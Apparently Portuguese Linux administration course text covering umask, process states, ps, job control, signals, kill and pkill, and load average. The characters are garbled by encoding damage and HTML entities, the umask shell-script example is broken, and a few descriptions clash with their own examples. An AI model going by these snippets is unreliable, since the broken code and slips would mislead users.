Se voc√™ criar um novo diret√≥rio, o sistema operacional iniciar√° atribuindo a ele permiss√µes octal 0777 (drwxrwxrwx). Se voc√™ criar um novo arquivo regular, o sistema operacional atribui a ele permiss√µes octal 0666 (-rw-rw-rw-). Voc√™ sempre precisa incluir explicitamente a permiss√£o de execu√ß√£o em um arquivo regular. Isso dificulta que um invasor comprometa um servi√ßo de rede para criar um novo arquivo e execut√°-lo imediatamente como um programa.
No entanto, a sess√£o de shell tamb√©m definir√° umask para restringir ainda mais as permiss√µes definidas inicialmente. Esse √© um bitmask octal usado para limpar as permiss√µes de novos arquivos e diret√≥rios criados pelo processo. Se um bit for definido no umask, a permiss√£o correspondente ser√° desmarcada nos novos arquivos. Por exemplo, o umask 0002, limpa o bit de grava√ß√£o para outros usu√°rios. Os zeros √† esquerda indicam que as permiss√µes especial, de usu√°rio e de grupo n√£o s√£o limpas. O umask de 0077 limpa todo o grupo e outras permiss√µes de arquivos recentemente criados.
O comando umask sem argumentos exibir√° o valor atual do umask do shell:
[user@host ~]$ umask 0002
Use o comando umask com apenas um argumento num√©rico para alterar o umask do shell atual. O argumento num√©rico deve ser um valor octal correspondente ao novo valor de umask. Voc√™ pode omitir zeros √† esquerda no umask.
Os valores de umask padr√£o do sistema para usu√°rios do shell Bash est√£o definidos nos arquivos /etc/profile ou /etc/bashrc. Os usu√°rios podem substituir os padr√µes do sistema em seus arquivos .bash_profile ou .bashrc nos diret√≥rios pessoais.
Exemplo de umask O exemplo a seguir explica como o umask afeta as permiss√µes de arquivos e diret√≥rios. Observe as permiss√µes padr√£o do umask para os arquivos e diret√≥rios no shell atual. O propriet√°rio e o grupo t√™m permiss√µes de leitura e grava√ß√£o nos arquivos e outros est√£o configurados para leitura. O propriet√°rio e o grupo t√™m permiss√µes de leitura, grava√ß√£o e execu√ß√£o nos diret√≥rios. A √∫nica permiss√£o para outros √© de leitura.
[user@host ~]$ umask 0002 [user@host ~]$ touch default [user@host ~]$ ls -l default.txt -rw-rw-r&amp;ndash;. 1 user user 0 May 9 01:54 default.txt [user@host ~]$ mkdir default [user@host ~]$ ls -ld default drwxrwxr-x. 2 user user 0 May 9 01:54 default
Definindo o valor umask como 0, as permiss√µes de arquivo para outras altera√ß√µes s√£o de leitura a leitura e grava√ß√£o. As permiss√µes do diret√≥rio para outras altera√ß√µes de leitura e execu√ß√£o a leitura, grava√ß√£o e execu√ß√£o.
[user@host ~]$ umask 0 [user@host ~]$ touch zero.txt [user@host ~]$ ls -l zero.txt -rw-rw-rw-. 1 user user 0 May 9 01:54 zero.txt [user@host ~]$ mkdir zero [user@host ~]$ ls -ld zero drwxrwxrwx. 2 user user 0 May 9 01:54 zero
Para mascarar todas as permiss√µes de arquivo e diret√≥rio para outros, defina o valor umask como 007.
[user@host ~]$ umask 007 [user@host ~]$ touch seven.txt [user@host ~]$ ls -l seven.txt -rw-rw&amp;mdash;-. 1 user user 0 May 9 01:55 seven.txt [user@host ~]$ mkdir seven [user@host ~]$ ls -ld seven drwxrwx&amp;mdash;. 2 user user 0 May 9 01:54 seven
Um umask com o valor de 027 garante que os novos arquivos tenham permiss√µes de leitura e grava√ß√£o para usu√°rio e permiss√£o de leitura para grupo. Novos diret√≥rios t√™m acesso de leitura e grava√ß√£o para grupo e nenhuma permiss√£o para outros.
[user@host ~]$ umask 027 [user@host ~]$ touch two-seven.txt [user@host ~]$ ls -l two-seven.txt -rw-r&amp;mdash;&amp;ndash;. 1 user user 0 May 9 01:55 two-seven.txt [user@host ~]$ mkdir two-seven [user@host ~]$ ls -ld two-seven drwxr-x&amp;mdash;. 2 user user 0 May 9 01:54 two-seven
O umask padr√£o para usu√°rios √© definido pelos scripts de inicializa√ß√£o do shell. Por padr√£o, se a UID da sua conta for 200 ou mais e seu nome de usu√°rio e nome do grupo principal forem os mesmos, ser√° atribu√≠do a voc√™ umask de 002. Caso contr√°rio, seu umask ser√° 022.
Como root, voc√™ pode alterar isso adicionando um script de inicializa√ß√£o do shell chamado /etc/profile.d/local-umask.sh que se parece com a sa√≠da deste exemplo:
[root@host ~]# cat /etc/profile.d/local-umask.sh
Overrides default umask configuration if [ $UID -gt 199 ] &amp;amp;&amp;amp; [ &amp;ldquo;id -gn&amp;rdquo; = &amp;ldquo;id -un&amp;rdquo; ]; then umask 007 else umask 022 fi
O exemplo anterior configurar√° o umask como 007 para usu√°rios com uma UID maior que 199 e com um nome de usu√°rio e um nome de grupo prim√°rio correspondentes e como 022 para todos os demais. Se voc√™ apenas quisesse configurar o umask de todos como 022, voc√™ poderia criar esse arquivo apenas com o seguinte conte√∫do:
Overrides default umask configuration umask 022
Para garantir que as altera√ß√µes globais de umask entrem em vigor, voc√™ deve fazer o logout do shell e fazer login novamente. At√© l√°, o umask configurado no shell atual ainda estar√° em vigor.
Cap√≠tulo 8. Monitoramento e gerenciamento de processos do Linux Listagem de processos Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de obter informa√ß√µes sobre programas em execu√ß√£o em um sistema para determinar o status, o uso de recursos e a propriedade deles para poder control√°-los. Defini√ß√£o de um processo
Um processo √© uma inst√¢ncia em execu√ß√£o de um programa execut√°vel iniciado. Um processo consiste em:
Um espa√ßo de endere√ßo de mem√≥ria alocada Propriedades de seguran√ßa, incluindo credenciais do propriet√°rio e privil√©gios Um ou mais threads de execu√ß√£o do c√≥digo do programa Estado do processo O ambiente de um processo inclui:
Vari√°veis locais e globais Um contexto de agendamento atual Recursos alocados do sistema, como descritores de arquivo e portas de rede Um processo existente (pai) duplica seu pr√≥prio espa√ßo de endere√ßos (fork) para criar uma nova estrutura de processo (filho). Cada novo processo recebe uma √∫nica ID de processo (PID) para rastreamento e seguran√ßa. A PID e a ID do processo pai (PPID) s√£o elementos do novo ambiente de processo. Qualquer processo pode criar um processo filho. Todos os processos s√£o descendentes do primeiro processo do sistema, systemd em um Red Hat Enterprise Linux 8 system).
lifecycle.png
Por meio da rotina fork, um processo filho herda as identidades de seguran√ßa, os descritores de arquivo atuais e anteriores, os privil√©gios de porta e de recurso, as vari√°veis de ambiente e o c√≥digo do programa. Um processo filho pode ent√£o realizar o exec de seu pr√≥prio c√≥digo do programa. Normalmente, um processo pai hiberna, enquanto o processo filho √© executado, configurando uma solicita√ß√£o (wait) a ser sinalizada quando da conclus√£o do filho. Ao sair, o processo filho j√° fechou ou descartou seus recursos e seu ambiente. O √∫nico recurso remanescente, chamado de zumbi, √© uma entrada na tabela de processos. O pai, sinalizado ativo quando o filho saiu, limpa a tabela de processo da entrada do filho, liberando, assim, o √∫ltimo recurso do processo do filho. O processo pai continua com sua pr√≥pria execu√ß√£o de c√≥digo do programa. Descri√ß√£o dos estados do processo
Em um sistema operacional multitarefa, cada CPU (ou n√∫cleo da CPU) pode estar trabalhando em um processo em determinado ponto no tempo. √Ä medida que um processo √© executado, seus requisitos imediatos de tempo de CPU e aloca√ß√£o de recursos se alteram. Os processos recebem uma atribui√ß√£o de state, a qual muda conforme a imposi√ß√£o das circunst√¢ncias.
states.png
Os estados de processo no Linux s√£o ilustrados no diagrama anterior e descritos na tabela a seguir.
Tabela 8.1. Estados de processo no Linux
process_linux_p1.png
Por que os estados do processo s√£o importantes?
Ao solucionar problemas de um sistema, √© importante entender como o kernel se comunica com os processos e como os processos se comunicam entre si. Na cria√ß√£o do processo, o sistema atribui um estado ao processo. A coluna S do comando top ou a coluna STAT do ps mostra o estado de cada processo. Em um sistema de CPU √∫nico, apenas um processo pode ser executado por vez. √â poss√≠vel ver v√°rios processos com um estado de R. No entanto, nem todos eles ser√£o executados consecutivamente, alguns deles ter√£o o status aguardando.
[user@host ~]$ top PID USER PR NI VIRT RES SHR S %CPU %MEM TIME&#43; COMMAND 1 root 20 0 244344 13684 9024 S 0.0 0.7 0:02.46 systemd 2 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kthreadd &amp;hellip;output omitted&amp;hellip;
[user@host ~]$ ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND &amp;hellip;output omitted&amp;hellip; root 2 0.0 0.0 0 0 ? S 11:57 0:00 [kthreadd] student 3448 0.0 0.2 266904 3836 pts/0 R&#43; 18:07 0:00 ps aux &amp;hellip;output omitted&amp;hellip;
O processo pode ser suspenso, interrompido, retomado, finalizado e interrompido usando sinais. Os sinais s√£o discutidos em mais detalhes posteriormente neste cap√≠tulo. Os sinais podem ser usados por outros processos, pelo pr√≥prio kernel ou por usu√°rios logados no sistema. Listagem de processos
O comando ps √© usado para listar os processos atuais. Ele pode fornecer informa√ß√µes detalhadas de processo, incluindo:
A identifica√ß√£o de usu√°rio (UID) que determina os privil√©gios de processo A identifica√ß√£o de processo (PID) √∫nica A CPU e o tempo real j√° utilizado O quanto de mem√≥ria o processo j√° alocou em v√°rios locais O local da sa√≠da do processo stdout, conhecido como o terminal de controle O estado atual do processo Importante
A vers√£o Linux do ps d√° suporte a tr√™s formatos:
Op√ß√µes UNIX (POSIX), que podem ser agrupadas e devem ser antecedidas de um tra√ßo Op√ß√µes BSD, que podem ser agrupadas e n√£o devem ser usadas com um tra√ßo Op√ß√µes extensas GNU, que s√£o precedidas por dois tra√ßos Por exemplo, ps -aux n√£o √© o mesmo que ps aux.
Talvez o conjunto de op√ß√µes mais comum, aux, exiba todos os processos, incluindo processos sem um terminal de controle. Uma listagem longa (op√ß√µes lax) oferece mais detalhes t√©cnicos, mas pode ser exibida mais rapidamente, evitando a procura pelo nome de usu√°rio. Uma sintaxe semelhante √† do UNIX usa as op√ß√µes -ef para exibir todos os processos.
[user@host ~]$ ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.1 0.1 51648 7504 ? Ss 17:45 0:03 /usr/lib/systemd/syst root 2 0.0 0.0 0 0 ? S 17:45 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? S 17:45 0:00 [ksoftirqd/0] root 5 0.0 0.0 0 0 ? S&amp;lt; 17:45 0:00 [kworker/0:0H] root 7 0.0 0.0 0 0 ? S 17:45 0:00 [migration/0] &amp;hellip;output omitted&amp;hellip; [user@host ~]$ ps lax F UID PID PPID PRI NI VSZ RSS WCHAN STAT TTY TIME COMMAND 4 0 1 0 20 0 51648 7504 ep_pol Ss ? 0:03 /usr/lib/systemd/ 1 0 2 0 20 0 0 0 kthrea S ? 0:00 [kthreadd] 1 0 3 2 20 0 0 0 smpboo S ? 0:00 [ksoftirqd/0] 1 0 5 2 0 -20 0 0 worker S&amp;lt; ? 0:00 [kworker/0:0H] 1 0 7 2 -100 - 0 0 smpboo S ? 0:00 [migration/0] &amp;hellip;output omitted&amp;hellip; [user@host ~]$ ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 17:45 ? 00:00:03 /usr/lib/systemd/systemd &amp;ndash;switched-ro root 2 0 0 17:45 ? 00:00:00 [kthreadd] root 3 2 0 17:45 ? 00:00:00 [ksoftirqd/0] root 5 2 0 17:45 ? 00:00:00 [kworker/0:0H] root 7 2 0 17:45 ? 00:00:00 [migration/0] &amp;hellip;output omitted&amp;hellip;
Por padr√£o, ps sem op√ß√µes seleciona todos os processos com a mesma ID de usu√°rio efetiva (EUID) como o usu√°rio atual, e os quais s√£o associados ao mesmo terminal onde ps foi invocado.
Processos entre par√™nteses (normalmente, na parte superior da lista) s√£o threads do kernel agendadas. Zumbis s√£o listados como de sa√≠da ou extintos. A sa√≠da de ps √© exibida uma vez. Usar top para uma exibi√ß√£o de processo que √© atualizada dinamicamente. ps pode ser exibido no formato de √°rvore para que voc√™ possa exibir as rela√ß√µes entre os processos pai e filho. A sa√≠da padr√£o √© classificada por n√∫mero de ID do processo. √Ä primeira vista, isso pode parecer ordem cronol√≥gica. No entanto, o kernel reutiliza as IDs do processo, portanto, o pedido √© menos estruturado do que aparece. Para classificar, use as op√ß√µes -O ou --sort. A ordem de exibi√ß√£o √© equivalente √† ordem da tabela de processos do sistema, a qual utiliza novamente as linhas na tabela √† medida que os processos s√£o extintos e novos processos s√£o criados. A sa√≠da poder√° parecer cronol√≥gica, mas isso n√£o √© garantido, a menos que as op√ß√µes -O ou --sort sejam usadas explicitamente. Controle de tarefas Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de usar o controle de tarefa do Bash para gerenciar v√°rios processos iniciados na mesma sess√£o de terminal. Descri√ß√£o de tarefas e sess√µes
O controle de tarefas √© um recurso do shell que permite a uma √∫nica inst√¢ncia do shell executar e gerenciar v√°rios comandos.
Uma tarefa √© associada a cada pipeline inserido em um prompt do shell. Todos os processos em um pipeline fazem parte da tarefa e s√£o membros do mesmo grupo de processos. Se apenas um comando for inserido em um prompt do shell, poder√° ser considerado um ‚Äúpipeline‚Äù m√≠nimo de um comando, criando uma tarefa com apenas um membro.
Somente uma tarefa por vez pode ler a entrada e os sinais gerados pelo teclado em uma janela de terminal. Os processos que fazem parte dessa tarefa s√£o processos de primeiro plano do terminal de controle.
Um processo em segundo plano no terminal de controle √© membro de qualquer outra tarefa associada ao terminal. Processos em segundo plano de um terminal n√£o podem ler a entrada ou receber interrup√ß√µes geradas pelo teclado a partir do terminal, mas podem ser gravados no terminal. Uma tarefa em segundo plano pode estar interrompida (suspensa) ou estar em execu√ß√£o. Se uma tarefa executada em segundo plano tentar ler a partir do terminal, ser√° suspensa automaticamente.
Cada terminal √© sua pr√≥pria sess√£o, e pode ter um processo em primeiro plano e qualquer n√∫mero de processos em segundo plano independentes. Uma tarefa faz parte de exatamente uma sess√£o, que pertence a seu terminal de controle.
O comando psmostra o nome de dispositivo do terminal de controle de um processo na coluna TTY. Alguns processos, como daemons do sistema, s√£o iniciados pelo sistema, e n√£o a partir de um prompt do shell. Esses processos n√£o t√™m um terminal de controle, n√£o s√£o membros de uma tarefa e n√£o podem ser colocados em primeiro plano. O comando ps exibe um ponto de interroga√ß√£o (?) na coluna TTY para esses processos. Execu√ß√£o de tarefas em segundo plano
√â poss√≠vel iniciar qualquer comando ou pipeline em segundo plano acrescentando um &amp;ldquo;e&amp;rdquo; comercial (&amp;amp;) no final da linha de comando. O shell Bash exibe um n√∫mero de tarefa (√∫nico para a sess√£o) e a PID do novo processo filho. O shell n√£o aguarda o processo filho ser conclu√≠do; em vez disso, ele exibe o prompt do shell.
[user@host ~]$ sleep 10000 &amp;amp; [1] 5947 [user@host ~]$
Nota
Quando uma linha de comando que cont√©m um pipe √© enviada para o segundo plano usando um &amp;ldquo;e&amp;rdquo; comercial, a PID do √∫ltimo comando no pipeline √© usada como sa√≠da. Todos os processos no pipeline ainda ser√£o membros dessa tarefa.
[user@host ~]$ example_command | sort | mail -s &amp;ldquo;Sort output&amp;rdquo; &amp;amp; [1] 5998
Voc√™ pode exibir a lista de tarefas que o Bash est√° rastreando para uma sess√£o espec√≠fica com o comando jobs.
[user@host ~]$ jobs [1]&#43; Running sleep 10000 &amp;amp; [user@host ~]$
√â poss√≠vel trazer uma tarefa em segundo plano para o primeiro plano usando o comando fg com sua ID de tarefa (%n√∫mero da tarefa).
[user@host ~]$ fg %1 sleep 10000
No exemplo anterior, o comando sleep agora √© executado em primeiro plano no terminal de controle. O shell volta a ser suspenso, aguardando a sa√≠da desse processo filho.
Para enviar um processo em primeiro plano ao segundo plano, primeiro pressione a solicita√ß√£o de suspens√£o gerada pelo teclado (Ctrl&#43;z) no terminal.
sleep 10000 ^Z [1]&#43; Stopped sleep 10000 [user@host ~]$
A tarefa √© imediatamente colocada em segundo plano e suspensa.
O comando ps j exibe informa√ß√µes relativas √†s tarefas. A PID √© a √∫nica ID do processo do processo. A PPID √© a PID do processo pai deste processo, o processo que o iniciou (ramificou). A PGID √© a PID do l√≠der do grupo de processo, normalmente o primeiro processo no pipeline da tarefa. A SID √© a PID do l√≠der da sess√£o, o que para uma tarefa normalmente √© o shell interativo em execu√ß√£o no terminal de controle. Como o comando sleep agora est√° suspenso, seu estado de processo √© T.
[user@host ~]$ ps j PPID PID PGID SID TTY TPGID STAT UID TIME COMMAND 2764 2768 2768 2768 pts/0 6377 Ss 1000 0:00 /bin/bash 2768 5947 5947 2768 pts/0 6377 T 1000 0:00 sleep 10000 2768 6377 6377 2768 pts/0 6377 R&#43; 1000 0:00 ps j
Para reiniciar o processo em segundo plano, use o comando bg com a mesma ID de tarefa.
[user@host ~]$ bg %1 [1]&#43; sleep 10000 &amp;amp;
O shell avisar√° um usu√°rio que tentar sair de uma janela de terminal (sess√£o) com tarefas suspensas. Se o usu√°rio tentar sair de novo imediatamente, as tarefas suspensas ser√£o canceladas. Nota
Observe o sinal de &#43; ap√≥s o [1] nos exemplos acima. O sinal &#43; indica que essa tarefa √© o trabalho padr√£o atual. Ou seja, se for usado um comando que espera um argumento %job number e um n√∫mero de trabalho n√£o for fornecido, a a√ß√£o √© executada na tarefa com o indicador &#43;.
Encerramento de processos Objetivos
Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de:
Usar os comandos para encerrar os processos e se comunicar com eles. Definir as caracter√≠sticas de um processo daemon. Encerrar sess√µes de usu√°rio e processos. Controle de processos com o uso de sinais
Um sinal √© uma interrup√ß√£o de software entregue a um processo. Os sinais relatam eventos a um programa em execu√ß√£o. Os eventos que geram um sinal podem ser um erro, um evento externo (uma solicita√ß√£o de E/S ou um temporizador expirado) ou um uso expl√≠cito de um comando de envio de sinal ou de uma sequ√™ncia de teclado.
A tabela abaixo lista os principais sinais usados pelos administradores do sistema para o gerenciamento dos processos de rotina. Consulte os sinais atrav√©s de seus nomes abreviados (HUP) ou de seus nomes pr√≥prios (SIGHUP).
Tabela 8.2. Sinais de gerenciamento de processo fundamentais
process_fundamentals.png
Nota
Os n√∫meros de sinaliza√ß√£o variam em diferentes plataformas de hardware Linux, mas os nomes de sinaliza√ß√£o e seus significados s√£o padronizados. Para usar o comando, aconselha-se utilizar os nomes de sinaliza√ß√£o em vez dos n√∫meros. Os n√∫meros discutidos nesta se√ß√£o s√£o para sistemas x86_64.
Cada sinal tem uma a√ß√£o padr√£o, geralmente uma das seguintes:
Term - faz com que um programa seja encerrado (saia) de imediato. Core - faz com que um programa salve uma imagem de mem√≥ria (despejo de mem√≥ria) e, em seguida, seja encerrado. Stop - faz com que um programa pare de ser executado (seja suspenso) e espere para ser continuado (retomado). Os programas podem ser preparados para reagir a sinais de evento esperados pela implementa√ß√£o de rotinas de manipula√ß√£o para ignorar, substituir ou estender uma a√ß√£o padr√£o do sinal.
Comandos para enviar sinais por solicita√ß√£o expl√≠cita
Voc√™ sinaliza o processo em primeiro plano atual digitando uma sequ√™ncia de controles do teclado para suspender (Ctrl&#43;z), encerrar (Ctrl&#43;c) ou despejar a mem√≥ria (Ctrl&#43;) do processo. No entanto, voc√™ usar√° comandos de envio de sinal para enviar sinais a um processo em segundo plano ou a processos em uma sess√£o diferente.
Sinais podem ser especificados como op√ß√µes pelo nome (por exemplo, -HUP ou -SIGHUP) ou por n√∫mero (o -1 relacionado). Os usu√°rios podem encerrar seus pr√≥prios processos, mas privil√©gios de root s√£o necess√°rios para terminar processos de propriedade de outros.
O comando kill envia um sinal a um processo pelo n√∫mero da PID. Apesar de seu nome, o comando kill pode ser usado para enviar um sinal, n√£o somente para encerrar programas. Voc√™ pode usar o comando kill -l para listar os nomes e n√∫meros de todos os sinais dispon√≠veis.
[user@host ~]$ kill -l
SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL 10) SIGUSR1 SIGSEGV 12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM SIGSTKFLT 17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP &amp;hellip;output omitted&amp;hellip; [user@host ~]$ ps aux | grep job 5194 0.0 0.1 222448 2980 pts/1 S 16:39 0:00 /bin/bash /home/user/bin/control job1 5199 0.0 0.1 222448 3132 pts/1 S 16:39 0:00 /bin/bash /home/user/bin/control job2 5205 0.0 0.1 222448 3124 pts/1 S 16:39 0:00 /bin/bash /home/user/bin/control job3 5430 0.0 0.0 221860 1096 pts/1 S&#43; 16:41 0:00 grep &amp;ndash;color=auto job [user@host ~]$ kill 5194 [user@host ~]$ ps aux | grep job user 5199 0.0 0.1 222448 3132 pts/1 S 16:39 0:00 /bin/bash /home/user/bin/control job2 user 5205 0.0 0.1 222448 3124 pts/1 S 16:39 0:00 /bin/bash /home/user/bin/control job3 user 5783 0.0 0.0 221860 964 pts/1 S&#43; 16:43 0:00 grep &amp;ndash;color=auto job [1] Terminated control job1 [user@host ~]$ kill -9 5199 [user@host ~]$ ps aux | grep job user 5205 0.0 0.1 222448 3124 pts/1 S 16:39 0:00 /bin/bash /home/user/bin/control job3 user 5930 0.0 0.0 221860 1048 pts/1 S&#43; 16:44 0:00 grep &amp;ndash;color=auto job [2]- Killed control job2 [user@host ~]$ kill -SIGTERM 5205 user 5986 0.0 0.0 221860 1048 pts/1 S&#43; 16:45 0:00 grep &amp;ndash;color=auto job [3]&#43; Terminated control job3 O comando killall pode sinalizar v√°rios processos, com base no nome do comando.
[user@host ~]$ ps aux | grep job 5194 0.0 0.1 222448 2980 pts/1 S 16:39 0:00 /bin/bash /home/user/bin/control job1 5199 0.0 0.1 222448 3132 pts/1 S 16:39 0:00 /bin/bash /home/user/bin/control job2 5205 0.0 0.1 222448 3124 pts/1 S 16:39 0:00 /bin/bash /home/user/bin/control job3 5430 0.0 0.0 221860 1096 pts/1 S&#43; 16:41 0:00 grep &amp;ndash;color=auto job [user@host ~]$ killall control [1] Terminated control job1 [2]- Terminated control job2 [3]&#43; Terminated control job3 [user@host ~]$
Use pkill para enviar um sinal para um ou mais processos que correspondam aos crit√©rios de sele√ß√£o. Os crit√©rios de sele√ß√£o podem ser um nome de comando, um processo pertencente a um usu√°rio espec√≠fico ou todos os processos do sistema. O comando pkill inclui crit√©rios de sele√ß√£o avan√ßados:
Command - Processos com um nome de comando correspondente ao padr√£o. UID - Processos de propriedade de uma conta de usu√°rio Linux, efetiva ou real. GID - Processos de propriedade de uma conta de grupo Linux, efetiva ou real. Parent - Processos filhos de um determinado processo pai. Terminal - Processos em execu√ß√£o em um terminal de controle espec√≠fico. [user@host ~]$ ps aux | grep pkill user 5992 0.0 0.1 222448 3040 pts/1 S 16:59 0:00 /bin/bash /home/user/bin/control pkill1 user 5996 0.0 0.1 222448 3048 pts/1 S 16:59 0:00 /bin/bash /home/user/bin/control pkill2 user 6004 0.0 0.1 222448 3048 pts/1 S 16:59 0:00 /bin/bash /home/user/bin/control pkill3 [user@host ~]$ pkill control [1] Terminated control pkill1 [2]- Terminated control pkill2 [user@host ~]$ ps aux | grep pkill user 6219 0.0 0.0 221860 1052 pts/1 S&#43; 17:00 0:00 grep &amp;ndash;color=auto pkill [3]&#43; Terminated control pkill3 [user@host ~]$ ps aux | grep test user 6281 0.0 0.1 222448 3012 pts/1 S 17:04 0:00 /bin/bash /home/user/bin/control test1 user 6285 0.0 0.1 222448 3128 pts/1 S 17:04 0:00 /bin/bash /home/user/bin/control test2 user 6292 0.0 0.1 222448 3064 pts/1 S 17:04 0:00 /bin/bash /home/user/bin/control test3 user 6318 0.0 0.0 221860 1080 pts/1 S&#43; 17:04 0:00 grep &amp;ndash;color=auto test [user@host ~]$ pkill -U user [user@host ~]$ ps aux | grep test user 6870 0.0 0.0 221860 1048 pts/0 S&#43; 17:07 0:00 grep &amp;ndash;color=auto test [user@host ~]$
Fazer o logout de usu√°rios administrativamente
Talvez seja necess√°rio desconectar outros usu√°rios por v√°rios motivos. Para citar algumas das diversas possibilidades: o usu√°rio cometeu uma viola√ß√£o de seguran√ßa; o usu√°rio pode ter usado recursos em excesso; o usu√°rio pode ter um sistema que n√£o responde; ou o usu√°rio tem acesso inadequado aos materiais. Nesses casos, talvez seja necess√°rio encerrar administrativamente sua sess√£o usando sinais.
Para fazer logoff de um usu√°rio, primeiro identifique a sess√£o de login a ser finalizada. Use o comando w para listar logins de usu√°rios e processos em execu√ß√£o atuais. Observe as colunas TTY e FROM para determinar as sess√µes a serem fechadas.
Todas as sess√µes de login do usu√°rio est√£o associadas a um dispositivo de terminal (TTY). Se o nome do dispositivo estiver no formato pts/N, ele √© um pseudo-terminal associado a uma janela de terminal gr√°fica ou sess√£o de login remoto. Se estiver no formato ttyN, o usu√°rio est√° em um console do sistema, em um console alternativo ou em outros dispositivos do terminal conectados diretamente.
[user@host ~]$ w 12:43:06 up 27 min, 5 users, load average: 0.03, 0.17, 0.66 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root tty2 12:26 14:58 0.04s 0.04s -bash bob tty3 12:28 14:42 0.02s 0.02s -bash user pts/1 desk.example.com 12:41 2.00s 0.03s 0.03s w [user@host ~]$
Descubra h√° quanto tempo um usu√°rio est√° no sistema visualizando o tempo de login da sess√£o. Para cada sess√£o, os recursos da CPU consumidos por tarefas atuais, incluindo tarefas em segundo plano e processos filhos, est√£o na coluna JCPU. O consumo de CPU dos processos em primeiro plano atuais est√° na coluna PCPU.
Os processos e sess√µes podem ser sinalizados individualmente ou em conjunto. Para encerrar todos os processos para um usu√°rio, use o comando pkill. Como o processo inicial em uma sess√£o de login (l√≠der da sess√£o) √© projetado para lidar com solicita√ß√µes de t√©rmino de sess√£o e para ignorar sinais de teclado n√£o intencionais, encerrar todos os processos e shells de login de usu√°rio requer o uso do sinal SIGKILL. Importante
O SIGKILL √© normalmente usado muito rapidamente pelos administradores.
Como o sinal SIGKILL n√£o pode ser manipulado ou ignorado, ele √© sempre fatal. No entanto, ele for√ßa o t√©rmino sem permitir que processos terminados abruptamente executem rotinas de autolimpeza. √â recomendado o envio de SIGTERM primeiro, seguido do SIGINT e, somente se os dois falharem, tentar novamente com o SIGKILL.
Primeiro, identifique os n√∫meros de PID a serem encerrados usando pgrep, que opera de modo semelhante ao pkill, inclusive usando as mesmas op√ß√µes, exceto por usar processos de listas pgrep, em vez de encerrar processos.
[root@host ~]# pgrep -l -u bob 6964 bash 6998 sleep 6999 sleep 7000 sleep [root@host ~]# pkill -SIGKILL -u bob [root@host ~]# pgrep -l -u bob [root@host ~]#
Quando os processos que exigem aten√ß√£o estiverem na mesma sess√£o de login, ele poder√° ser desnecess√°rio para encerrar todos os processos do usu√°rio. Determine o terminal de controle para a sess√£o usando o comando w. Em seguida, encerre somente os processos que fazem refer√™ncia √† mesma ID de terminal. A menos que SIGKILL seja especificado, o l√≠der da sess√£o (aqui, o shell de login Bash) lida com a solicita√ß√£o de t√©rmino com sucesso e sobrevive a ela, mas todos os outros processos da sess√£o s√£o terminados.
[root@host ~]# pgrep -l -u bob 7391 bash 7426 sleep 7427 sleep 7428 sleep [root@host ~]# w -h -u bob bob tty3 18:37 5:04 0.03s 0.03s -bash [root@host ~]# pkill -t tty3 [root@host ~]# pgrep -l -u bob 7391 bash [root@host ~]# pkill -SIGKILL -t tty3 [root@host ~]# pgrep -l -u bob [root@host ~]#
O mesmo t√©rmino seletivo de processos pode ser aplicado usando rela√ß√µes de processos de pai e filho. Use o comando pstree para exibir uma √°rvore de processo ao sistema ou a um √∫nico usu√°rio. Use a PID do processo pai para encerrar todos os filhos que foram criados. Desta vez, o shell de login Bash pai sobrevive, porque o sinal √© orientado apenas a seus processos filhos.
[root@host ~]# pstree -p bob bash(8391)‚îÄ‚î¨‚îÄsleep(8425) ‚îú‚îÄsleep(8426) ‚îî‚îÄsleep(8427) [root@host ~]# pkill -P 8391 [root@host ~]# pgrep -l -u bob bash(8391) [root@host ~]# pkill -SIGKILL -P 8391 [root@host ~]# pgrep -l -u bob bash(8391) [root@host ~]#
Monitoramento de atividade de processo Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de descrever qual √© a m√©dia de carga e determinar os processos respons√°veis pelo uso elevado de recursos em um servidor. Descri√ß√£o da m√©dia de carga
A m√©dia de carga √© uma medida fornecida pelo kernel do Linux que √© uma maneira simples de representar a carga do sistema percebida ao longo do tempo. Ela pode ser usada como um indicador aproximado de quantas solicita√ß√µes de recursos do sistema est√£o pendentes e para determinar se a carga do sistema est√° aumentando ou diminuindo com o tempo.
A cada cinco segundos, o kernel coleta o n√∫mero de carga atual, com base no n√∫mero de processos em estados execut√°veis e ininterruptos. Esse n√∫mero √© acumulado e informado como uma m√©dia m√≥vel exponencial nos √∫ltimos 1, 5 e 15 minutos.
Compreens√£o do c√°lculo da m√©dia de carga do Linux
A m√©dia de carga representa a carga do sistema percebida em determinado per√≠odo de tempo. O Linux determina isso informando quantos processos est√£o prontos para execu√ß√£o em uma CPU e quantos processos est√£o aguardando a conclus√£o de E/S de disco ou rede.
O n√∫mero de carga √© uma m√©dia m√≥vel do n√∫mero de processos que est√£o prontos para execu√ß√£o (em estado de processo R) ou est√£o esperando pela conclus√£o de E/S (em estado de processo D). Alguns sistemas UNIX s√≥ consideram o uso da CPU ou o comprimento da fila de execu√ß√£o para indicar a carga do sistema. O Linux tamb√©m inclui o uso de disco ou rede porque isso pode ter um impacto t√£o significativo no desempenho do sistema quanto a carga da CPU. Ao experimentar m√©dias de carga altas com atividade m√≠nima de CPU, examine a atividade do disco e da rede. A m√©dia de carga √© uma medida aproximada de quantos processos est√£o atualmente aguardando que uma solicita√ß√£o seja conclu√≠da antes que eles possam fazer qualquer outra coisa. A solicita√ß√£o pode ser por tempo de CPU para executar o processo. Como alternativa, a solicita√ß√£o pode ser para a conclus√£o de uma opera√ß√£o cr√≠tica de E/S do disco e o processo n√£o pode ser executado na CPU at√© que a solicita√ß√£o seja conclu√≠da, mesmo se a CPU estiver ociosa. De qualquer maneira, a carga do sistema √© afetada e o sistema parece ser executado de modo mais lento porque os processos est√£o aguardando a execu√ß√£o.
Interpreta√ß√£o dos valores de m√©dia de carga exibidos
